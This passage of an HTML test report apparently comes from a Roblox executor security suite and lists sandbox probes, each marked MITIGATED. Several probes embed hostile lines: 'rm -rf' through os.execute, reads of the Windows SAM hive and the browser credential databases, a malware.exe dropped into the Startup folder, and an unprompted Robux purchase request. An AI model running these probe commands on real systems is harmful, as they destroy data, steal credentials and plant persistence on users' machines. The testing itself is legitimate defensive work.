+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>GuiService:OpenNativeOverlay()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p17',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p17'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "GuiService:OpenNativeOverlay()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("GuiService"):OpenNativeOverlay()
+        end)
+        assert(errorMsg, "GuiService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>GuiService:OpenBrowserWindow()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p18',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p18'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "GuiService:OpenBrowserWindow()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("GuiService"):OpenBrowserWindow()
+        end)
+        assert(errorMsg, "GuiService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>BrowserService:EmitHybridEvent()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p19',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p19'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "BrowserService:EmitHybridEvent()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("BrowserService"):EmitHybridEvent()
+        end)
+        assert(errorMsg, "BrowserService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>BrowserService:ExecuteJavaScript()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p20',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p20'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "BrowserService:ExecuteJavaScript()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("BrowserService"):ExecuteJavaScript()
+        end)
+        assert(errorMsg, "BrowserService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>BrowserService:OpenBrowserWindow()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p21',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p21'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "BrowserService:OpenBrowserWindow()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("BrowserService"):OpenBrowserWindow()
+        end)
+        assert(errorMsg, "BrowserService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>BrowserService:OpenNativeOverlay()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p22',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p22'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "BrowserService:OpenNativeOverlay()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("BrowserService"):OpenNativeOverlay()
+        end)
+        assert(errorMsg, "BrowserService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>BrowserService:ReturnToJavaScript()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p23',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p23'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "BrowserService:ReturnToJavaScript()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("BrowserService"):ReturnToJavaScript()
+        end)
+        assert(errorMsg, "BrowserService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>BrowserService:SendCommand()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p24',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p24'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "BrowserService:SendCommand()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("BrowserService"):SendCommand()
+        end)
+        assert(errorMsg, "BrowserService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:Call()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p25',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p25'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:Call()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):Call()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:GetLast()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p26',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p26'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:GetLast()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):GetLast()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:GetMessageId()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p27',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p27'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:GetMessageId()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):GetMessageId()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:GetProtocolMethodRequestMessageId()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p28',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p28'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:GetProtocolMethodRequestMessageId()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):GetProtocolMethodRequestMessageId()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:GetProtocolMethodResponseMessageId()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p29',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p29'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:GetProtocolMethodResponseMessageId()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):GetProtocolMethodResponseMessageId()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:MakeRequest()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p30',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p30'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:MakeRequest()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):MakeRequest()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:Publish()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p31',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p31'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:Publish()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):Publish()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:PublishProtocolMethodRequest()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p32',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p32'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:PublishProtocolMethodRequest()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):PublishProtocolMethodRequest()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:PublishProtocolMethodResponse()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p33',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p33'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:PublishProtocolMethodResponse()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):PublishProtocolMethodResponse()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:Subscribe()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p34',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p34'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:Subscribe()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):Subscribe()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:SubscribeToProtocolMethodRequest()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p35',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p35'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:SubscribeToProtocolMethodRequest()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):SubscribeToProtocolMethodRequest()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:SubscribeToProtocolMethodResponse()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p36',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p36'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:SubscribeToProtocolMethodResponse()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):SubscribeToProtocolMethodResponse()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>OpenCloudService:HttpRequestAsync()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p37',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p37'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "OpenCloudService:HttpRequestAsync()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("OpenCloudService"):HttpRequestAsync()
+        end)
+        assert(errorMsg, "OpenCloudService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>ScriptContext:AddCoreScriptLocal()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p38',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p38'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "ScriptContext:AddCoreScriptLocal()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("ScriptContext"):AddCoreScriptLocal()
+        end)
+        assert(errorMsg, "ScriptContext vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>DataModel:Load()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p39',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p39'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "DataModel:Load()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("DataModel"):Load()
+        end)
+        assert(errorMsg, "DataModel vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>DataModel:OpenScreenshotsFolder()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p40',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p40'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "DataModel:OpenScreenshotsFolder()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("DataModel"):OpenScreenshotsFolder()
+        end)
+        assert(errorMsg, "DataModel vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>DataModel:OpenVideosFolder()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p41',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p41'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "DataModel:OpenVideosFolder()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("DataModel"):OpenVideosFolder()
+        end)
+        assert(errorMsg, "DataModel vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>OmniRecommendationsService:MakeRequest()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p42',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p42'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "OmniRecommendationsService:MakeRequest()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("OmniRecommendationsService"):MakeRequest()
+        end)
+        assert(errorMsg, "OmniRecommendations vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Players:ReportAbuse()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p43',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p43'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Players:ReportAbuse()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("Players"):ReportAbuse()
+        end)
+        assert(errorMsg, "Players service vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Players:ReportAbuseV3()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p44',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p44'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Players:ReportAbuseV3()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("Players"):ReportAbuseV3()
+        end)
+        assert(errorMsg, "Players service vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>CoreGui:TakeScreenshot()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p45',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p45'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "CoreGui:TakeScreenshot()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("CoreGui"):TakeScreenshot()
+        end)
+        assert(errorMsg, "Screenshot capability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Robux API Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p46',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p46'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Robux API Access",
+    callback = function()
+        local hasHTTP = HttpChecker.check("Request","") or HttpChecker.check("Get","Get") or HttpChecker.check("Post","Post")
+        if hasHTTP then
+            local results = {}
+            Utils.safePcall(function()
+                if request then
+                    results.v1 = request({
+                        Url    = "https://economy.roblox.com/v1/user/currency",
+                        Method = "GET"
+                    })
+                end
+            end)
+            Utils.safePcall(function()
+                results.v2 = game:HttpGet("https://economy.roblox.com/v1/user/currency")
+            end)
+            Utils.safePcall(function()
+                results.v3 = game:HttpPost(
+                    "https://economy.roblox.com/v1/purchases/products/41762",
+                    '{"expectedCurrency":1,"expectedPrice":0,"expectedSellerId":116444}'
+                )
+            end)
+            assert(results.v1==nil or results.v2==nil or results.v3==nil, "Roblox API access")
+        else
+            return "Executor does not support HTTP functions"
+        end
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>ScriptContext:AddCoreScriptLocal</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p47',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p47'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "ScriptContext:AddCoreScriptLocal",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("ScriptContext"):AddCoreScriptLocal("CoreScripts/ProximityPrompt", actor)
+        end)
+        assert(errorMsg, "CoreScript access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:Publish (URL)</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p48',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p48'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:Publish (URL)",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):Publish(
+                game:GetService("MessageBusService"):GetMessageId("Linking","openURLRequest"),
+                { url = "notepad.exe" }
+            )
+        end)
+        assert(errorMsg, "System command execution")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>os.execute()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p49',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p49'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "os.execute()",
+    callback = function()
+        local success, errorMsg = pcall(function() os.execute("rm -rf") end)
+        assert(errorMsg, "OS command execution")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>ContentProvider:PreloadAsync</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p50',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p50'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "ContentProvider:PreloadAsync",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            for _, descendant in ipairs(game:GetService("Players"):GetDescendants()) do
+                if descendant:IsA("ScreenGui") then
+                    game:GetService("ContentProvider"):PreloadAsync(descendant)
+                end
+            end
+        end)
+        assert(errorMsg, "ContentProvider misuse")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>listfiles() root access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p51',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p51'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "listfiles() root access",
+    callback = function()
+        if not listfiles then return "Executor does not support function" end
+        local _, e1 = pcall(function() local f = listfiles(""); if #f &gt; 0 then end end)
+        local _, e2 = pcall(function() local f = listfiles("C:\\"); if #f &gt; 0 then end end)
+        assert(e1 or e2, "File system access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>System32 Access Attempt</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p52',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p52'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "System32 Access Attempt",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile("C:\\Windows\\System32\\config\\SAM")
+        end)
+        assert(err, "System file access vulnerability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>User Directory Enumeration</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p53',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p53'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "User Directory Enumeration",
+    callback = function()
+        if not listfiles then return "Executor does not support function" end
+        local _, err = pcall(function()
+            local f = listfiles("C:\\Users")
+            for _,v in ipairs(f) do print(v) end
+        end)
+        assert(err, "Unrestricted user directory access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Program Files Write Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p54',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p54'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Program Files Write Access",
+    callback = function()
+        if not writefile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            writefile("C:\\Program Files\\malicious.exe","test")
+        end)
+        assert(err, "Program Files write vulnerability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Startup Folder Persistence</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p55',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p55'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Startup Folder Persistence",
+    callback = function()
+        if not writefile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            local p = os.getenv("APPDATA")
+                .. "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe"
+            writefile(p,"persistence_test")
+        end)
+        assert(err, "Startup persistence vulnerability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Browser Data Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p56',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p56'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Browser Data Access",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile(os.getenv("LOCALAPPDATA").."\\Google\\Chrome\\User Data\\Default\\Login Data")
+            readfile(os.getenv("LOCALAPPDATA").."\\Microsoft\\Edge\\User Data\\Default\\Login Data")
+        end)
+        assert(err, "Browser credential access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>System: OS/IO Library RCE</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p58',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p58'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "System: OS/IO Library RCE",
+    callback = function()
+        local dangerous = {}
+        pcall(function() if io.popen    then dangerous["io.popen"]    = io.popen    end end)
+        pcall(function() if os.execute  then dangerous["os.execute"]  = os.execute  end end)
+        pcall(function() if os.remove   then dangerous["os.remove"]   = os.remove   end end)
+        pcall(function() if os.rename   then dangerous["os.rename"]   = os.rename   end end)
+        if next(dangerous) then error("CRITICAL: Dangerous OS/IO functions present!") end
+    end,
